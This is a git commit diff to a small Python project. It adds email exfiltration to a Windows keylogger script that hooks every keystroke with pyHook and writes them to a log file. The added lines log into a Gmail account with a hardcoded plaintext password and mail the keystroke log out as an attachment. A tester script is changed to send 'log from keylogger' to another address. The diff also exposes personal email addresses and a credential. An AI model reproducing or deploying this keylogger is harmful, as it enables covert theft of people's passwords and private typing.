869c38859e66c4e61b18d3c2b1ddf2a1dcd01c84
tsili852 <nick.tsilivis@gmail.com>
2014-01-31 23:37:55 +0200

    Finished pyGmail

--- logging/log.pyw
+++ logging/log.pyw
@@ -1,5 +1,6 @@
 import pyHook, pythoncom, sys, logging
-log_file = "C:\\Users\\tsilivisn\\Desktop\\log.txt"
+from pygmail import pygmail
+log_file = "C:\\log.txt"
 
 def OnKeyboardEvent(event):
     logging.basicConfig(filename = log_file, level = logging.DEBUG, format = '%(message)s')
@@ -11,3 +12,8 @@ hooks_manager = pyHook.HookManager()
 hooks_manager.KeyDown = OnKeyboardEvent
 hooks_manager.HookKeyboard()
 pythoncom.PumpMessages()
+
+
+g = pygmail()
+g.login('nick.tsilivis@gmail.com', 'notorious3')
+g.send_email_with_attachmen("nick.tsilivis@gmail.com", "nick.tsilivis@gmail.com", "log from keylogger", "C:\\", "log.txt")
--- pyGmail/tester.py
+++ pyGmail/tester.py
@@ -13,9 +13,9 @@ from time import gmtime, strftime
 
 g = pygmail()
 g.login('nick.tsilivis@gmail.com', 'notorious3')
-
-print g.response
-
+##
+##print g.response
+##
 ##g.get_mailboxes()
 ##for item in g.mailboxes:
 ##    print item
@@ -28,9 +28,9 @@ print g.response
 ##
 ##for mail in id_list:
 ##    print(g.get_mail_from_id(mail))
+##
+##g.logout()
+##
+##g.send_email("nick.tsilivis@gmail.com", "p.tsilivis10@gmail.com", "Automatic python email " + strftime("%Y-%m-%d %H:%M:%S", gmtime()), "This is an automatic email sent from python program")
 
-g.logout()
-
-g.send_email("nick.tsilivis@gmail.com", "p.tsilivis10@gmail.com", "Automatic python email " + strftime("%Y-%m-%d %H:%M:%S", gmtime()), "This is an automatic email sent from python program")
-
-
+g.send_email_with_attachmen("nick.tsilivis@gmail.com", "moustant21@gmail.com", "log from keylogger", "C:\\Users\\nick\\Pictures\\test\\", "log.txt")
